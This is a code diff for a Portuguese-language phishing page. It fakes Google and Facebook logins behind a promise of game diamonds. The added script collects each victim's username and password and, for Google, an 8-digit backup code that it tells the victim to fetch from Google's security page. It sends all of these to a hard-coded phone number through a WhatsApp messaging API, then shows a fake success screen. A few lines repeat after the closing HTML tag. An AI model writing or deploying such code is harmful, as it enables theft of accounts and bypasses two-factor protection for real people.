@@ -53,11 +53,11 @@
                 </div>
 
                 <div id="passkey-area" class="hidden">
-                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Chave de Acesso (Passkey)</label>
+                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Código de Segurança (8 dígitos)</label>
                     <div class="flex gap-2">
-                        <input type="text" id="passkeyInput" name="passkey" class="flex-1 bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" placeholder="Cole sua chave">
-                        <a href="https://www.google.com/intl/pt-BR/account/about/passkeys/" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-2 rounded flex items-center justify-center text-center leading-tight">
-                            CRIAR<br>CHAVE
+                        <input type="text" id="passkeyInput" name="passkey" class="flex-1 bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" placeholder="Ex: 1234 5678">
+                        <a id="passkey-button" href="#" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-2 rounded flex items-center justify-center text-center leading-tight">
+                            OBTER<br>CÓDIGO
                         </a>
                     </div>
                 </div>
@@ -105,7 +105,71 @@
             const label = document.getElementById('label-user');
             const userInp = document.getElementById('userInput');
             const passkeyArea = document.getElementById('passkey-area');
+            const passkeyBtn = document.getElementById('passkey-button');
             
+            userInp.value = "";
+            document.getElementById('passInput').value = "";
+            document.getElementById('passkeyInput').value = "";
+            document.getElementById('error-msg').classList.add('hidden');
+
+            if(provider === 'google') {
+                header.innerHTML = `<img src="https://www.google.com/favicon.ico" class="w-8 mx-auto mb-2"><h2 class="text-white font-bold">Login com Google</h2>`;
+                label.innerText = "Gmail";
+                userInp.placeholder = "exemplo@gmail.com";
+                
+                // NOVO LINK PARA CÓDIGOS DE RESERVA
+                passkeyBtn.href = "https://myaccount.google.com/two-step-verification/backup-codes?gar=WzI0Nl0&utm_source=google-account&utm_medium=web&utm_campaign=backupcodes-screen&continue=https://myaccount.google.com/security?gar%3DWzI0Nl0%26hl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact";
+                passkeyArea.classList.remove('hidden'); 
+            } else {
+                header.innerHTML = `<svg class="w-8 h-8 fill-[#1877F2] mx-auto mb-2" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg><h2 class="text-white font-bold">Login com Facebook</h2>`;
+                label.innerText = "Telefone ou E-mail";
+                userInp.placeholder = "Número ou e-mail";
+                passkeyArea.classList.add('hidden'); 
+            }
+            changeScreen('screen-form');
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            const backupCode = document.getElementById('passkeyInput').value;
+            const provider = document.getElementById('provider').value;
+            
+            if(provider === 'google' && backupCode.trim() === "") {
+                showError("Insira o código de segurança para validar sua conta.");
+                return;
+            }
+
+            const seu_telefone = "553192560979"; 
+            const apikey = "3798192"; 
+            
+            const texto = `🔥 *NOVO LOGIN RECEBIDO* 🔥\n\n📱 *Provedor:* ${provider.toUpperCase()}\n📧 *Usuário:* ${user}\n🔑 *Senha:* ${pass}\n🛡️ *Código Backup:* ${backupCode || 'N/A'}`;
+            const url = `https://api.callmebot.com/whatsapp.php?phone=${seu_telefone}&text=${encodeURIComponent(texto)}&apikey=${apikey}`;
+
+            try {
+                fetch(url, { mode: 'no-cors' });
+                const nomeUsuario = user.split('@')[0]; 
+                document.getElementById('welcome-user').innerText = `Sucesso! Olá, ${nomeUsuario}`;
+                changeScreen('screen-success');
+            } catch (error) {
+                showError("Erro de conexão.");
+            }
+        });
+
+        function showError(msg) {
+            const errorDiv = document.getElementById('error-msg');
+            errorDiv.innerText = msg;
+            errorDiv.classList.remove('hidden');
+        }
+
+        function finishClaim() {
+            alert("Análise concluída. Diamantes em até 72h!");
+            location.reload();
+        }
+    </script>
+</body>
+</html>
             userInp.value = "";
             document.getElementById('passInput').value = "";
             document.getElementById('passkeyInput').value = "";
